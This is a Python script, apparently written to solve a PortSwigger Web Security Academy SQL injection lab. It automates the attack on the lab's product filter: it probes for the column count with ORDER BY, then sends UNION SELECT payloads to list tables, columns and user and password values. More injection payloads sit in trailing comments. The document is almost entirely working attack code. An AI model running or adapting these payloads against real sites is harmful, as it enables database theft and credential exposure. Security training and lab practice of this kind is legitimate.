import requests

session = requests.session()

burp0_url = "https://acb31fad1e2d047dc067947a00de00aa.web-security-academy.net:443/filter?category=Gifts"
burp0_cookies = {"session": "xXn6N42SQTeUuVOgJbXAU3MEbSXjMfFl"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Dnt": "1", "Referer": "https://acb31fad1e2d047dc067947a00de00aa.web-security-academy.net/filter?category=Tech+gifts", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}
# session.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)

# ######################  until here burp paste of request for python  ########################## #

# lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

cookies = burp0_cookies
headers = burp0_headers
number_of_columns = 0
columns = ""

table = "all_tables"
# table = "all_tab_columns"
# table = "USER$"

value = "table_name"
# value = "column_name"
# value = "'user '||user||'password '||password"


def send_request_order_by(number: int):
    url = burp0_url + f"'+ORDER+BY+{number}--+-"
    # print(url)
    response = requests.get(url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
    # print(response)
    if response.status_code == 200:
        return True
    else:
        return False


def send_payload(number_of_columns, burp0_url):
    nulllist = []
    for i in range(number_of_columns):
        nulllist.append('NULL')

    for ii in range(number_of_columns):
        nulllist[ii] = value
        payload_var = ",".join(nulllist)
        print(payload_var)
        sqli_payload = f"'+UNION+SELECT+{payload_var}+FROM+{table}--+-"
        loaded_url = str(burp0_url + sqli_payload)
        print(loaded_url)
        response = requests.get(loaded_url, headers=headers, cookies=cookies, proxies={"http": "http://127.0.0.1:8080"})
        print(response)
        nulllist[ii] = "NULL"








if __name__ == '__main__':
    for i in range(4, 0, -1):
        print(f"trying {i}")
        if send_request_order_by(i):
            number_of_columns = i
            print(f"this is the number of columns to UNION BY: {i}")
            break
    send_payload(number_of_columns, burp0_url)


# PayLoad:
# UNION SELECT NULL,NULL,NULL FROM information_schema.tables--+-

# Accessories' UNION SELECT table_name,NULL FROM all_tables WHERE table_name LIKE '%LOG%'-- -